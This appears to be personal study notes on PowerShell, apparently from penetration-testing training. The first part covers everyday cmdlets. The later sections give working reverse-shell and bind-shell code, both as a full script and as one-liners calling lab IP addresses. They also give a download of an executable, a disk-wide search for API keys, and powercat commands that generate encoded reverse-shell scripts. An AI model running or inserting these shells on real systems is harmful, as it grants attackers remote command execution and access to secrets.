---
title: Powershell
tags:
- snippet
- tool
- shell
- windows
- powershell
---

Powershell is an object-oriented scripting language made for Windows.

Most commands are commandlets which are typically of the form *Verb*-*Noun*.  
Common verbs: **Get**, **Start**, **Stop**, **Read**, **Write**, **New**, **Out**  
For more common verbs see:  
https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands?view=powershell-7.

## Man Pages

To get information about a cmdlet, use the `Get-Help` cmdlet.

eg.
```powershell
Get-Help Get-Process
```

To see example usages, pass the `-Examples` flag

## Syntax

Case insensitive

Backtick to escape characters

Can use `|` to pipe the output of a cmdlet into another  
???+ note
    As the output of cmdlets are objects not raw strings, it is different from a bash pipe

## Execution Policy

By default, only signed scripts can be run, this can be chagned with
```powershell
Set-ExecutionPolicy -Scope CurrentUser Bypass
```
If you have Admin, you can leave out the `-Scope CurrentUser`

## Useful Commands

### Get-Command

Roughly equivalent to `which` in bash

Lists commands on the current computer.  
Supports pattern matching eg.
```powershell
Get-Command New-*
```

### Get-Member

Gets properties and methods of objects

TODO: Work out what that means

### Get-ChildItem

Roughly like `ls` in bash

eg. List files and directories in `Desktop` folder
```powershell
Get-ChildItem .\Desktop\
```

To see hidden files use `-Force`

eg. An agnozing example
```powershell
Get-ChildItem -Path C:\ -Force -Recurse -ErrorAction SilentlyContinue -Include interesting-file*
```

### Get-Content

Get contents of file, like bash `cat` command.

### Select-Object

Pull out properties from output of another cmdlet.

eg. To list just the mode and name for files/dirs within the current directory
```powershell
Get-ChildItem | Select-Object -Property Mode, Name
```

eg. Get first 5 items in current directory (like `head` in bash)
```powershell
Get-ChildItem | Select-Object -First 5
```

eg. Get last 5 items in current directory (like `tail` in bash)
```powershell
Get-ChildItem | Select-Object -Last 5
```
Other useful flags:
- Index
- Unique
- Skip
- ExcludeProperty

### Where-Object

Only select objects that match a filter. Sort of like `grep`.

eg. List files modified after 10/4/2019
```powershell
Get-ChildItem | Where-Object -Property LastWriteTime -GT 10/4/2019
```
Useful operators:

- `-Contains` - if collection has item that exactly matches
- `-EQ` - Exactly equal
- `-LT`
- `-GT`
- `-GE` - Greater than or equal

For more details:  
https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object?view=powershell-7.1#examples

### Sort-Object

Kinda like bash `sort` command.

Useful flags:

- `-Unique` 

Example I don't understand:
```powershell
Get-Service | Sort-Object -Property @{Expression = "Status"; Descending = $True}, @{Expression = "DisplayName"; Descending = $False}
```

## Base64

Powershell does not have a native way to do Base64 encode / decode so instead you can do

Decoding
```powershell
$data = Get-Content .\b64.txt
$decoded = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
```

Encoding
```powershell
$decoded = Get-Content .\somefile.txt
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($decoded))
```

## Other Useful Commands

- Measure-Object - like `wc`
- Invoke-Webrequest - like `curl` or `wget`
- Get-FileHash - like `md5sum`
- Get-Location - like `pwd`
- Get-LocalUser - list users
- Get-LocalGroup - list groups
- Get-NetIPAddress - like `ip addr`
- Get-NetTCPConnection - like `netstat -t`
- Get-HotFix - list installed updates

## Other Tasks

Find files containing the string "API_KEY"
```powershell
Get-ChildItem -ErrorAction SilentlyContinue -Recurse -Path C:\ | Select-String -ErrorAction SilentlyContinue "API_KEY" -List | Select Path
```

Download a file
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe', 'C:\Users\Public\wget.exe')
```

Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.119.154',9001);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
}
$client.Close();
```

Or as a one liner
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"
```

Bind Shell
```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

## Powercat

"I just want netcat"
Download **powercat**
```bash
sudo apt install powercat
```
Then copy over `/usr/share/windows-resources/powercat/powercat.ps1`

Run `. .\powercat.ps1`

Then you can use `powercat` mostly in place of netcat

Bind Shell
```powershell
powercat -l -p 443 -e cmd.exe
```
Reverse Shell
```powershell
powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

Generate a standalone script for reverse shell
```powershell
powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
```
Generate a base64 encoded standalone script for reverse shell
```powershell
powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > reverseshellencoded.ps1
```
